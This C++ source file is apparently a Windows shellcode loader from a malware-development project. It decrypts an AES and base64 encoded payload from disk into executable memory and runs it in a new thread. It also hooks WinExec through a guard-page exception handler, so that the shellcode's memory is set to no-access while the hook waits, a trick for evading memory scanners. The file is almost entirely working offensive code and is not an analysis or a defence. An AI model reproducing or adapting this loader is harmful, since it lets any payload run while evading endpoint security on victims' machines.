#include <iostream>
#include <windows.h>
#include <fstream>
#include <vector>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")

using namespace std;

vector<char> shellcode;
void* exec_mem;
SIZE_T leng = 0;
DWORD old = 0;

const char AES_KEY[16] = { 0xdb, 0x6f, 0x8, 0x7d, 0x79, 0xac, 0x21, 0x1f, 0x0, 0x3, 0x54, 0xeb, 0xd8, 0xc0, 0x9e, 0x71 };

void aes_decrypt(unsigned char* data, SIZE_T len) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;
    CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, (BYTE*)AES_KEY, sizeof(AES_KEY), 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    DWORD dwLen = (DWORD)len;
    CryptDecrypt(hKey, NULL, TRUE, 0, data, &dwLen);
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
}

void base64_decode(unsigned char* data, SIZE_T* len) {
    DWORD decodedSize = 0;
    CryptStringToBinaryA((LPCSTR)data, (DWORD)*len, CRYPT_STRING_BASE64, NULL, &decodedSize, NULL, NULL);
    CryptStringToBinaryA((LPCSTR)data, (DWORD)*len, CRYPT_STRING_BASE64, data, &decodedSize, NULL, NULL);
    *len = decodedSize;
}

// Our custom WinExec function
UINT MyWinExec(LPCSTR lpCmdLine, UINT uCmdShow)
{
    // Protect shellcode with PAGE_NOACCESS 
    printf("[*] Changing protection to PAGE_NOACCESS\n");
    VirtualProtect(exec_mem, leng, PAGE_NOACCESS, &old);
    Sleep(5000);

    // Recall original WinExec after delay to continue execution
    printf("[+] Recalling WinExec...\n");
    UINT result = WinExec(lpCmdLine, uCmdShow);

    // Restore protection PAGE_EXECUTE_READ
    printf("[*] Recovering protection to PAGE_EXECUTE_READ\n");
    VirtualProtect(exec_mem, leng, PAGE_EXECUTE_READ, &old);
    return result;
}

LONG WINAPI handler(struct _EXCEPTION_POINTERS* ExceptionInfo) {
    // Checking if the exception code is a Page Guard violation
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_GUARD_PAGE_VIOLATION)
    {
        // Checking if the exception occured on calling WinExec
        if (ExceptionInfo->ContextRecord->Rip == DWORD64(WinExec)) {
            printf("[*] Hooking WinExec...\n");
            
            // Redirecting RIP to our custom function
            ExceptionInfo->ContextRecord->Rip = DWORD64(&MyWinExec);
        }
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

int main()
{
    ifstream infile;
    infile.open(R"(D:\Maldev\shellcodes\aes_b64_calc1.bin)", std::ios::in | std::ios::binary);
    infile.seekg(0, std::ios::end);
    size_t file_size_in_byte = infile.tellg();
    shellcode.resize(file_size_in_byte);
    infile.seekg(0, std::ios::beg);
    infile.read(reinterpret_cast<char*>(shellcode.data()), shellcode.size());
    infile.close();

    

    leng = shellcode.size();

    // Allocate executable memory
    exec_mem = VirtualAlloc(NULL, leng, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy shellcode into allocated memory
    RtlMoveMemory(exec_mem, shellcode.data(), leng);

    // Register Vectored Exception Handler
    AddVectoredExceptionHandler(1, handler);

    // Decrypt & decode shellcode
    aes_decrypt((unsigned char*)exec_mem, leng);
    base64_decode((unsigned char*)exec_mem, &leng);

    // Set up PAGE_GUARD on WinExec
    // WinExec is being called in the shellcode to spawn a calc
    VirtualProtect(WinExec, 1, PAGE_EXECUTE_READ | PAGE_GUARD, &old);

    // Creating a thread with the shellcode and running it
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    return 0;
}